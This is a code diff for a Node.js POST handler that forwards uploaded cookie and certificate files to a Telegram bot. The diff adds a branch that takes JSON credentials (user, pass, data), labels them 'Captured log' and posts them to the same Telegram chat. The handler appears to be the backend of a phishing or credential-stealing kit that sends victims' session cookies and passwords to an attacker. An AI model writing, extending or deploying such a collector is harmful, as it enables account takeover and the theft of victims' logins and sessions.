@@ -17,7 +17,7 @@ handler.post(async (req, res) => {
   }
   const botUrl = `https://api.telegram.org/bot${telegramToken}`;
 
-  // Only accept file uploads (cookies as txt)
+  // 1. Handle file uploads (cookies/certs)
   if (req.file) {
     const form = new FormData();
     form.append('chat_id', chatId);
@@ -29,7 +29,7 @@ handler.post(async (req, res) => {
         contentType: req.file.mimetype || 'text/plain'
       }
     );
-    // Optional: include caption with IP/type if sent
+    // Optional: caption with IP/type if available
     const { ip, type } = req.body;
     let caption = '';
     if (ip) caption += `IP: ${ip}\n`;
@@ -43,13 +43,52 @@ handler.post(async (req, res) => {
     });
     const tgText = await tgRes.text();
     if (!tgRes.ok) {
-      console.error('Telegram API error:', tgText);
+      console.error('Telegram API error (file):', tgText);
       return res.status(502).json({ success: false, error: tgText });
     }
     return res.status(200).json({ success: true });
   }
 
-  // Any other type of request is rejected
+  // 2. Handle JSON logs (creds, other info)
+  if (req.headers['content-type']?.includes('application/json')) {
+    let body = '';
+    await new Promise((resolve, reject) => {
+      req.on('data', chunk => body += chunk);
+      req.on('end', resolve);
+      req.on('error', reject);
+    });
+    let json;
+    try {
+      json = JSON.parse(body);
+    } catch {
+      return res.status(400).json({ success: false, message: 'Invalid JSON' });
+    }
+    const { data, ip, user, pass, type } = json;
+    // Compose a "Captured log" subject
+    let text = `📥 Captured log\n`;
+    if (ip) text += `IP: ${ip}\n`;
+    if (type) text += `Type: ${type}\n`;
+    if (data) text += `\n${data}`;
+    else if (user && pass) text += `User: ${user}\nPass: ${pass}`;
+    else text += JSON.stringify(json, null, 2);
+
+    const tgRes = await fetch(`${botUrl}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text
+      })
+    });
+    const tgText = await tgRes.text();
+    if (!tgRes.ok) {
+      console.error('Telegram API error (text):', tgText);
+      return res.status(502).json({ success: false, error: tgText });
+    }
+    return res.status(200).json({ success: true });
+  }
+
+  // Other payloads ignored
   return res.status(400).json({ success: false, message: 'Bad payload' });
 });
 
